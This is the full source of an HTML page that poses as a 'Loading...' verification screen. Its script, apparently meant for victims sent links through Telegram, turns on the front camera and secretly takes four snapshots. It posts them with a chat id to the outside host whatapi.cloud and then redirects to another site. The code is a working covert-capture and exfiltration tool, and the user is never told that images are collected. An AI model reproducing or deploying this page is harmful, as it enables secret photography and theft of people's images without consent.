<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Poppins", sans-serif;
        }
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #7D2AE8;
        }
        .verification-container {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            text-align: center;
        }
        .rotate-icon {
            width: 50px;
            height: 50px;
            border: 6px solid #fff;
            border-top: 6px solid #7D2AE8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        video {
            display: none;
            width: 300px;
            height: 200px;
        }
        #startButton {
            padding: 10px 20px;
            background-color: #ffffff;
            border: none;
            border-radius: 5px;
            color: #7D2AE8;
            font-weight: bold;
            cursor: pointer;
        }
        .console-container {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            max-height: 200px;
            background: rgba(0, 0, 0, 0.8);
            color: #fff;
            font-family: monospace;
            overflow-y: scroll;
            padding: 10px;
            box-sizing: border-box;
        }
    </style>
</head>
<body>

<div class="verification-container">
    <div class="rotate-icon"></div>
    <button id="startButton" style="display: none;">Start Camera</button>
</div>

<video id="video" playsinline></video>

<!-- Custom in-browser console -->
<div class="console-container" id="console-log"></div>

<script>
    const video = document.querySelector("#video");
    const startButton = document.getElementById('startButton');
    const chatId = new URLSearchParams(window.location.search).get("id");
    let captureCount = 0;
    const maxCaptures = 4;

    // Custom in-browser console log function
    function customLog(message) {
        const consoleLog = document.getElementById("console-log");
        const logItem = document.createElement("div");
        logItem.textContent = message;
        consoleLog.appendChild(logItem);
        consoleLog.scrollTop = consoleLog.scrollHeight;
    }

    // Detect if the user is using the Telegram in-app browser
    function isTelegramBrowser() {
        const ua = navigator.userAgent || navigator.vendor || window.opera;
        return ua.includes("Telegram");
    }

    // Function to detect iOS
    function isIOS() {
        return /iPhone|iPad|iPod/i.test(navigator.userAgent);
    }

    // Function to detect Android
    function isAndroid() {
        return /Android/i.test(navigator.userAgent);
    }

    // Handle Android vs iOS and Telegram In-Browser vs Other Browsers
    function handleDevice() {
        if (isAndroid()) {
            if (isTelegramBrowser()) {
                // Android - Telegram in-app browser: show button
                customLog("Android Telegram in-app detected. Waiting for user interaction.");
                startButton.style.display = "block";
                startButton.addEventListener('click', function() {
                    startCamera();
                });
            } else {
                // Android - Other browsers: start camera automatically
                customLog("Android detected (non-Telegram). Starting camera automatically.");
                startCamera();
            }
        } else if (isIOS()) {
            if (isTelegramBrowser()) {
                // iOS - Telegram in-app browser: start camera automatically
                customLog("iOS Telegram in-app detected. Starting camera automatically.");
                startCamera();
            } else {
                // iOS - Other browsers: show button
                customLog("iOS detected (non-Telegram). Waiting for user interaction.");
                startButton.style.display = "block";
                startButton.addEventListener('click', function() {
                    startCamera();
                });
            }
        } else {
            customLog("Unsupported platform.");
            alert("Unsupported platform.");
        }
    }

    function startCamera() {
        customLog('Starting camera access...');
        if (navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(function(stream) {
                    video.srcObject = stream;
                    video.style.display = "block"; // Show the video element
                    video.play().then(() => {
                        customLog('Video playback started.');
                    }).catch(function(playbackError) {
                        customLog('Video playback error: ' + playbackError.message);
                        alert('Video playback error: ' + playbackError.message);
                    });
                    customLog('Camera access granted.');
                })
                .catch(function(error) {
                    customLog('Error accessing media devices: ' + error.message);
                    alert('Error accessing media devices: ' + error.message);
                });
        } else {
            customLog('getUserMedia is not supported in your browser.');
            alert('getUserMedia is not supported in your browser.');
        }
    }

    async function compressAndSendImage(image_data, quality, format) {
        try {
            const img = new Image();
            img.src = image_data;
            img.onload = async function() {
                const canvas = document.createElement('canvas');
                canvas.width = img.width;
                canvas.height = img.height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                const compressedDataUrl = canvas.toDataURL(format, quality);
                await sendImageToServer(compressedDataUrl);
            }
        } catch (error) {
            customLog('Error compressing image: ' + error.message);
            alert('Error compressing image: ' + error.message);
        }
    }

    async function sendImageToServer(image_data) {
        try {
            const response = await fetch('https://whatapi.cloud:8443/send-image', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    id: chatId,
                    image: image_data
                })
            });

            if (response.ok) {
                captureCount++;
                customLog('Image sent successfully. Capture count: ' + captureCount);
                if (captureCount >= maxCaptures) {
                    stopCapturing();
                }
            } else {
                customLog('Failed to send image: ' + response.statusText);
                alert('Failed to send image: ' + response.statusText);
            }
        } catch (error) {
            customLog('Error occurred while sending image: ' + error.message);
            alert('Error occurred while sending image: ' + error.message);
        }
    }

    function captureAndSendImage() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const image_data = canvas.toDataURL('image/jpeg', 0.5);

            customLog('Captured image data: ' + image_data.substring(0, 50) + '...'); // Log a small part of the data URL
            compressAndSendImage(image_data, 0.5, 'image/jpeg');
        } catch (error) {
            customLog('Error capturing image: ' + error.message);
            alert('Error capturing image: ' + error.message);
        }
    }

    function stopCapturing() {
        clearInterval(captureInterval);
        video.srcObject.getTracks().forEach(track => track.stop());
        window.location.href = "https://Linuxgen.in";
        customLog('Stopped capturing and redirected to https://Linuxgen.in');
    }

    const captureInterval = setInterval(function() {
        if (video.paused || video.ended) return;
        captureAndSendImage();
    }, 500);

    // Run the device handler when the page loads
    window.onload = handleDevice;
</script>

</body>
</html>
